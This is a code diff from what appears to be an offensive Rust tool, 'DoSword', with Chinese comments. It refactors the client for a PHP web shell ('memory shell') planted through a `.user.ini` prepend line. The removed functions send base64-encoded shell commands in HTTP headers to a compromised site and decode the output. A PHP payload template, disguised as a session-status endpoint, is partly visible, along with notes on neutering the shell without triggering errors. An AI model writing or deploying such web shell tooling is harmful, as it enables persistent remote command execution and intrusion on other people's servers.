@@ -7,12 +7,9 @@
 //! 载荷是**参数化分发器**（ping / exec / uninstall），不是「传什么代码执行什么」，
 //! 且无正确令牌时立即 `return`，不影响站点正常请求。
 
-use base64::Engine;
 use dosword_sdk::domain::AppSettings;
 use dosword_sdk::{Protocol, ProtocolError, SessionState};
 use serde::{Deserialize, Serialize};
-
-use super::{CMD_HEADER, OP_HEADER, TOKEN_HEADER};
 
 /// 安装产物。全部进句柄 —— 这是「全新 DoSword 实例也能卸载」的依据。
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -130,82 +127,6 @@ pub fn uninstall_via_files(
 }
 
 /// 发一次内存马操作请求。`op` ∈ ping / exec / uninstall。
-pub fn http_op(
-    settings: &AppSettings,
-    url: &str,
-    token: &str,
-    op: &str,
-    cmd: Option<&str>,
-) -> Result<String, String> {
-    let client = crate::protocol::transport::build_client(settings);
-    let mut request = client
-        .post(url)
-        .header(OP_HEADER, op)
-        .header(TOKEN_HEADER, token);
-    if let Some(cmd) = cmd {
-        let encoded = base64::engine::general_purpose::STANDARD.encode(cmd.as_bytes());
-        request = request.header(CMD_HEADER, encoded);
-    }
-    let response = request
-        .send()
-        .map_err(|error| format!("请求失败：{error}"))?;
-    let status = response.status();
-    let body = response
-        .text()
-        .map_err(|error| format!("读取响应失败：{error}"))?;
-    if !status.is_success() {
-        return Err(format!(
-            "HTTP {status}：{}",
-            body.chars().take(200).collect::<String>()
-        ));
-    }
-    Ok(body)
-}
-
-pub fn check(settings: &AppSettings, url: &str, token: &str, name: &str) -> bool {
-    http_op(settings, url, token, "ping", None)
-        .map(|body| body.contains(&format!("DSW_MEM:{name}:OK")))
-        .unwrap_or(false)
-}
-
-pub fn exec(
-    settings: &AppSettings,
-    url: &str,
-    token: &str,
-    command: &str,
-) -> Result<String, String> {
-    let body = http_op(settings, url, token, "exec", Some(command))?;
-    body.strip_prefix("DSW_MEM:")
-        .and_then(|rest| {
-            base64::engine::general_purpose::STANDARD
-                .decode(rest.trim())
-                .ok()
-        })
-        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
-        .ok_or_else(|| {
-            format!(
-                "响应格式异常：{}",
-                body.chars().take(200).collect::<String>()
-            )
-        })
-}
-
-/// 中和载荷：改写为无害占位 + 从 `.user.ini` 摘除本载荷的 prepend 行。
-///
-/// **不会删除载荷文件** —— 目标 PHP 会缓存 `.user.ini` 内容 `user_ini.cache_ttl` 秒，
-/// 直接删文件会让站点在该窗口内每个请求 500（已实测）。删除应在 TTL 之后进行。
-pub fn uninstall_via_payload(settings: &AppSettings, url: &str, token: &str) -> Result<(), String> {
-    let body = http_op(settings, url, token, "uninstall", None)?;
-    if body.contains("DSW_MEM:NEUTERED") {
-        Ok(())
-    } else {
-        Err(format!(
-            "中和响应异常：{}",
-            body.chars().take(200).collect::<String>()
-        ))
-    }
-}
-
 const PAYLOAD_TPL: &str = r#"<?php
 /* 会话状态查询接口 */
 function dsw_mem_eq($a, $b)
@@ -272,6 +193,7 @@ if ($__dsw_op === 'uninstall') {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::memshell::{check, exec, uninstall_via_payload};
 
     #[test]
     fn payload_is_silent_without_token_and_has_all_ops() {
